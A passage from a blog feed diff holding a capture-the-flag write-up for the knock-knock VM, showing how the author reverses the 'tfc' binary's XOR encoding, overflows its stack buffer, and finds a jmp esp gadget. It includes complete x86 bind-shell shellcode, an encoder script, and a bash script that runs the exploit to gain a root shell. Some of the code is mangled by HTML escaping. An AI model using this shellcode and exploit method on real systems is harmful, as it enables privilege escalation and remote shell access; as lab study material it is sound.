+    <span class="n">block</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">:(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>
+    <span class="n">int_block</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&amp;lt;i&#39;</span><span class="p">,</span> <span class="n">block</span><span class="p">)</span>
+    <span class="n">output</span> <span class="o">+=</span> <span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;i&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">int_block</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="n">xorkey</span><span class="p">)))</span>
+
+    <span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">v8</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">xorkey</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mh">0x7fffffff</span><span class="p">)</span> <span class="c"># not sure why 0x7fff.. i.o. 0xffff</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">xorkey</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span> 
+            <span class="n">v7</span> <span class="o">=</span> <span class="n">v8</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">v7</span> <span class="o">=</span> <span class="n">v8</span> <span class="o">^</span> <span class="mh">0x6daa1cf4</span>
+        <span class="n">xorkey</span> <span class="o">=</span> <span class="n">v7</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;out2.tfc&#39;</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span></code></pre></div></p>
+
+<p>Like I said, a CTF mindset and some very ugly Python code, but I was now able to encode my payload (updated version at end of post). I gave it a spin:</p>
+
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>python -c <span class="p">&amp;</span>lsquo<span class="p">;</span>print <span class="p">&amp;</span>ldquo<span class="p">;</span>A<span class="p">&amp;</span>rdquo<span class="p">;</span>*5000<span class="p">&amp;</span>rsquo<span class="p">;</span> &gt; in.tfc
+bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>python ./enc.py
+bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>./tfc out2.tfc bleh.tfc
+Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>gdb ./tfc core
+GNU gdb <span class="o">(</span>GDB<span class="o">)</span> 7.4.1-debian
+&lt;snip&gt;
+Core was generated by <span class="p">&amp;</span>lsquo<span class="p">;</span>./tfc out2.tfc bleh.tfc<span class="p">&amp;</span>rsquo<span class="p">;</span>.
+Program terminated with signal 11, Segmentation fault.&lt;/p&gt;
+
+&lt;h1&gt;0  0x41414141 in ?? <span class="o">()</span>&lt;/h1&gt;
+
+&lt;p&gt;gdb-peda<span class="err">$</span></code></pre></div></p>
+
+<p>Yeah! I was able to overwrite <code>eip</code>! I narrowed down the buffer and determined which part was responsible for overwriting <code>eip</code> by trial-and-error and looking at the stack in the coredump. I finally found:</p>
+
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span>python -c <span class="p">&amp;</span>lsquo<span class="p">;</span>print <span class="p">&amp;</span>ldquo<span class="p">;</span>A<span class="p">&amp;</span>rdquo<span class="p">;</span>&lt;em&gt;4124+<span class="p">&amp;</span>ldquo<span class="p">;</span>B<span class="p">&amp;</span>rdquo<span class="p">;</span>&lt;/em&gt;4+<span class="p">&amp;</span>ldquo<span class="p">;</span>C<span class="p">&amp;</span>rdquo<span class="p">;</span>*4<span class="p">&amp;</span>rsquo<span class="p">;</span> &gt; in.tfc <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> python ./enc.py
+bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>./tfc out2.tfc bleh.tfc
+Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>gdb ./tfc core
+GNU gdb <span class="o">(</span>GDB<span class="o">)</span> 7.4.1-debian
+&lt;snip&gt;
+Program terminated with signal 11, Segmentation fault.&lt;/p&gt;
+
+&lt;h1&gt;0  0x42424242 in ?? <span class="o">()</span>&lt;/h1&gt;
+
+&lt;p&gt;gdb-peda<span class="nv">$ </span>checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : disabled
+gdb-peda<span class="nv">$ </span>q
+bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>readelf -l tfc&lt;/p&gt;
+
+&lt;p&gt;Elf file <span class="nb">type </span>is EXEC <span class="o">(</span>Executable file<span class="o">)</span>
+Entry point 0x8048500
+There are <span class="m">8</span> program headers, starting at offset 52&lt;/p&gt;
+
+&lt;p&gt;Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4
+  INTERP         0x000134 0x08048134 0x08048134 0x00013 0x00013 R   0x1
+      <span class="o">[</span>Requesting program interpreter: /lib/ld-linux.so.2<span class="o">]</span>
+  LOAD           0x000000 0x08048000 0x08048000 0x00c48 0x00c48 R E 0x1000
+  LOAD           0x000c48 0x08049c48 0x08049c48 0x00250 0x00254 RW  0x1000
+  DYNAMIC        0x000c54 0x08049c54 0x08049c54 0x000f0 0x000f0 RW  0x4
+  NOTE           0x000148 0x08048148 0x08048148 0x00044 0x00044 R   0x4
+  GNU_EH_FRAME   0x000b54 0x08048b54 0x08048b54 0x00034 0x00034 R   0x4
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
+&lt;snip&gt;</code></pre></div></p>
+
+<p>Okay, great. The stack is executable so I could stash the shellcode there. ASLR on the remote machine was enabled, so all I needed was a <code>jmp esp</code> to jump to the shellcode. I found one conveniently located in the binary, but I really had to dig:</p>
+
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">gdb-peda<span class="nv">$ </span>b main
+Breakpoint <span class="m">1</span> at 0x8048927
+gdb-peda<span class="nv">$ </span>r
+&lt;snip&gt;
+Breakpoint 1, 0x08048927 in main <span class="o">()</span>
+gdb-peda<span class="nv">$ </span>find <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="se">\x</span>ff<span class="se">\x</span>e4<span class="p">&amp;</span>rdquo<span class="p">;</span> all
+Searching <span class="k">for</span> <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="se">\x</span>ff<span class="se">\x</span>e4<span class="p">&amp;</span>rsquo<span class="p">;</span> in: all ranges
+Found <span class="m">96</span> results, display max <span class="m">96</span> items:
+       tfc : 0x8048e93 <span class="p">&amp;</span>ndash<span class="p">;</span>&gt; 0xe4ff
+       tfc : 0x8049e93 <span class="p">&amp;</span>ndash<span class="p">;</span>&gt; 0xe4ff
+      libc : 0xf7e18a85 <span class="p">&amp;</span>ndash<span class="p">;</span>&gt; 0x7f1be4ff
+      libc : 0xf7e4fdad <span class="o">(</span>jmp    esp<span class="o">)</span>
+      libc : 0xf7f6deb3 <span class="p">&amp;</span>ndash<span class="p">;</span>&gt; 0xffffe4ff
+&lt;snip&gt;
+gdb-peda<span class="nv">$ </span>x/i 0x8048e93
+   0x8048e93:   jmp    esp</code></pre></div></p>
+
+<p>With that hurdle taken, I first verified the exploit by making the shellcode a bunch of <code>int 3</code>s. This made <code>tfc</code> crash with SIGTRAP, confirming that it worked. I used <a href="http://shell-storm.org/shellcode/files/shellcode-672.php">bind@64533</a>, my favorite shellcode. Finally, my exploit looked like this:</p>
+
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">python -c <span class="p">&amp;</span>lsquo<span class="p">;</span>print <span class="p">&amp;</span>ldquo<span class="p">;</span>A<span class="p">&amp;</span>rdquo<span class="p">;</span>*4124+ <span class="c"># filler</span>
+    <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="se">\x</span>93<span class="se">\x</span>9e<span class="se">\x</span>04<span class="se">\x</span>08<span class="p">&amp;</span>rdquo<span class="p">;</span>+    <span class="c"># overwrite eip</span>
+    <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="se">\x</span>83<span class="se">\x</span>ec<span class="se">\x</span>7f<span class="p">&amp;</span>rdquo<span class="p">;</span> +       <span class="c"># sub esp, 127 to reserve stack space, followed by the shellcode</span>
+    <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="se">\x</span>6a<span class="se">\x</span>66<span class="se">\x</span>6a<span class="se">\x</span>01<span class="se">\x</span>5b<span class="se">\x</span>58<span class="se">\x</span>99<span class="se">\x</span>52<span class="se">\x</span>6a<span class="se">\x</span>01<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>89<span class="se">\x</span>c6<span class="se">\x</span>6a<span class="se">\x</span>66<span class="se">\x</span>58<span class="se">\x</span>43<span class="se">\x</span>52<span class="se">\x</span>66<span class="se">\x</span>68<span class="se">\x</span>fc<span class="se">\x</span>15<span class="se">\x</span>66<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>6a<span class="se">\x</span>10<span class="se">\x</span>51<span class="se">\x</span>56<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>6a<span class="se">\x</span>66<span class="se">\x</span>58<span class="se">\x</span>43<span class="se">\x</span>43<span class="se">\x</span>6a<span class="se">\x</span>05<span class="se">\x</span>56<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>6a<span class="se">\x</span>66<span class="se">\x</span>58<span class="se">\x</span>43<span class="se">\x</span>52<span class="se">\x</span>52<span class="se">\x</span>56<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>89<span class="se">\x</span>c3<span class="se">\x</span>6a<span class="se">\x</span>3f<span class="se">\x</span>58<span class="se">\x</span>31<span class="se">\x</span>c9<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>6a<span class="se">\x</span>3f<span class="se">\x</span>58<span class="se">\x</span>41<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>99<span class="se">\x</span>50<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span>59<span class="se">\x</span>cd<span class="se">\x</span>80<span class="p">&amp;</span>rdquo<span class="p">;</span>+
+    <span class="p">&amp;</span>ldquo<span class="p">;</span>AAAAAAAAAAAAAAAAAAA<span class="p">&amp;</span>rdquo<span class="p">;</span>  <span class="c"># some padding</span>
+    <span class="p">&amp;</span>rsquo<span class="p">;</span> &gt; in.tfc <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> python ./enc.py</code></pre></div></p>
+
+<p>This generated the file <code>out2.tfc</code>. I verified the exploit locally, after which I transferred it over to knock-knock. I ran the exploit and connected to <code>localhost:64533</code> with my fingers crossed:</p>
+
+<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">jason@knockknock:~<span class="nv">$ </span>xxd sploit.tfc <span class="p">|</span>head
+0000000: def0 5bab 5df7 ab43 <span class="m">0690</span> fe64 6cb0 0b48  ..<span class="o">[</span>.<span class="o">]</span>..C<span class="p">&amp;</span>hellip<span class="p">;</span>dl..H
+0000010: <span class="m">2986</span> 416f <span class="m">7467</span> df5c 21a2 453f e5cc 806c  <span class="o">)</span>.Aotg.!.E?<span class="p">&amp;</span>hellip<span class="p">;</span>l
+0000020: 2bd0 <span class="m">0142</span> b5c2 <span class="m">2466</span> <span class="m">3525</span> c114 26dc <span class="m">1979</span>  +..B..<span class="nv">$f5</span>%..<span class="p">&amp;</span>amp<span class="p">;</span>..y
+0000030: 1dd0 7c53 5b49 3b52 012e 942b 549a fe77  ..<span class="p">|</span>S<span class="o">[</span>I<span class="p">;</span>R<span class="p">&amp;</span>hellip<span class="p">;</span>+T..w
+0000040: e104 <span class="m">0424</span> cd9f e437 f09c 3f69 <span class="m">0095</span> <span class="m">7727</span>  <span class="p">&amp;</span>hellip<span class="p">;</span><span class="nv">$&amp;</span>hellip<span class="p">;</span>7..?i..w<span class="err">&#39;</span>
+0000050: d017 <span class="m">3307</span> b61e 733c 41f9 8c5e f98c 5e41  ..3<span class="p">&amp;</span>hellip<span class="p">;</span>s<span class="p">&amp;</span>lt<span class="p">;</span>A..^..^A
+0000060: 9a35 <span class="m">9167</span> ccf8 1f00 a809 c919 309d c241  .5.g<span class="p">&amp;</span>hellip<span class="p">;&amp;</span>hellip<span class="p">;</span>..0..A
+0000070: 8f7a 207c f8b3 <span class="m">7765</span> 9a72 <span class="m">7417</span> 8b1d 6f00  .z <span class="p">|</span>..we.rt<span class="p">&amp;</span>hellip<span class="p">;</span>o.
+0000080: b137 a610 ee6c 1a61 966e <span class="m">1438</span> 0c19 e245  .7<span class="p">&amp;</span>hellip<span class="p">;</span>l.a.n.8<span class="p">&amp;</span>hellip<span class="p">;</span>E
+0000090: c7e6 f342 abc1 <span class="m">9363</span> 504c af0b 199e d551  <span class="p">&amp;</span>hellip<span class="p">;</span>B<span class="p">&amp;</span>hellip<span class="p">;</span>cPL<span class="p">&amp;</span>hellip<span class="p">;</span>..Q
+jason@knockknock:~<span class="err">$</span>
+jason@knockknock:~<span class="err">$</span>
+jason@knockknock:~<span class="nv">$ </span>./tfc sploit.tfc bleh.tfc <span class="p">&amp;</span>amp<span class="p">;</span>
+<span class="o">[</span>1<span class="o">]</span> 3578
+jason@knockknock:~<span class="nv">$ </span>nc localhost 64533
+id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>jason<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>jason<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,1000<span class="o">(</span>jason<span class="o">)</span>
+whoami
+root</code></pre></div></p>
+
+<p>From here, I could view the flag:</p>
+
+<p><img src="/assets/knockknock-02.png" alt="" /></p>
+
+<p>Game over!</p>
+
+<p>Or was it? leonjza came up with a nice idea, why not use the core dump instead to extract the encrypted payload? I spent some time and came up with the following bash script. It abuses the fact that the encrypted file will start with the same bytes every time. This script generates the exact same payload as before:</p>
+
+<p><div><script src='https://gist.github.com/b285dd9865fe82188959.js?file=tfc_exploit.sh'></script>
+<noscript><pre><code>#!/bin/bash
+
+# exploit for last stage of knockknock vm
+
+echo &quot;[+] building shellcode...&quot;
+$(python -c 'print &quot;A&quot;*4124+&quot;\x93\x9e\x04\x08&quot;+&quot;\x83\xec\x7f\x6a\x66\x6a\x01\x5b\x58\x99\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66\x68\xfc\x15\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x6a\x66\x58\x43\x43\x6a\x05\x56\xcd\x80\x6a\x66\x58\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x6a\x3f\x58\x31\xc9\xcd\x80\x6a\x3f\x58\x41\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80&quot;' &gt; in.tfc)
+
+if [ ! -f in.tfc ];
+then
+	echo &quot;[!] shellcode not found!&quot;
+	exit 1
+fi
+
+SPLOIT=in.tfc
+SPLOIT_LEN=$(cat $SPLOIT |wc -c)
+
+# enable coredumps
+ulimit -c unlimited
+# copy the setuid binary
+cp ./tfc ./pwn
+# use tfc to encode shellcode
+./pwn $SPLOIT derp.tfc 2&amp;&gt;/dev/null
+
+if [ -f core ]; then
+	echo &quot;[+] core found.&quot; 
+	# because of the way the encryption works, the first four 
+	# bytes are always def0 5bab. let's abuse this fact.
+	SPLOIT_START_HEX=$(xxd core|grep 'def0.5bab'|awk '{print $1}' |tr -d ':')
+	SPLOIT_START=$(printf &quot;%d&quot; 0x$SPLOIT_START_HEX)
+	echo &quot;[+] found encrypted shellcode at offset $SPLOIT_START&quot;
+	echo &quot;[+] extracting... $SPLOIT_LEN&quot;
+	dd if=core of=./tfc-sploit.tfc bs=1 skip=$SPLOIT_START count=$SPLOIT_LEN &amp;&gt;/dev/null
+	if [ -f tfc-sploit.tfc ]; then
+		echo &quot;[+] running exploit. catch the shell at localhost:64533&quot;
+		./tfc ./tfc-sploit.tfc derp.tfc &amp;
+	fi
+else
+	echo &quot;[!] core not found!&quot;
+	exit 1
+fi
+
+echo &quot;[+] cleaning up. all done!&quot;
+rm ./pwn &amp;&gt;/dev/null
+rm ./tfc-sploit.tfc &amp;&gt;/dev/null
+rm ./in.tfc &amp;&gt;/dev/null
+exit 0</code></pre></noscript></div>
+</p>
+
+<p>I will leave a ROP exploit &lsquo;as an exercise to the reader&rsquo; :) knock-knock was a fun VM and so thanks to zer0w1re and c0ne!</p>
+
+<p>Updated <code>enc.py</code>, contained another error but should be fixed now:</p>
+
+<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">xcrypt</span><span class="p">(</span><span class="n">infile</span><span class="p">,</span> <span class="n">outfile</span><span class="p">):</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">infile</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="n">xor_key</span> <span class="o">=</span> <span class="mh">0xea1ab19f</span> 
+
+<span class="n">output</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span><span class="p">):</span>
+    <span class="n">block</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span> <span class="s">&#39;&amp;lt;L&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span> <span class="p">:</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">output</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span> <span class="s">&#39;&amp;lt;L&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">block</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">)</span> <span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">temp_xor_key</span> <span class="o">=</span> <span class="n">xor_key</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="mi">1</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mi">1</span><span class="p">):</span>
+            <span class="n">temp_xor_key</span> <span class="o">^=</span> <span class="mh">0x6daa1cf4</span>
+        <span class="n">xor_key</span> <span class="o">=</span> <span class="n">temp_xor_key</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">outfile</span><span class="p">,</span> <span class="s">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">close</span>
+<span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">if</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">name</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">main</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;&amp;</span><span class="n">rsquo</span><span class="p">;:</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">usage</span><span class="p">:</span> <span class="p">{}</span> <span class="o">&lt;</span><span class="n">infile</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">outfile</span><span class="o">&gt;&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="n">xcrypt</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+<span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span></code></pre></div></p>
 ]]></content>
   </entry>
   
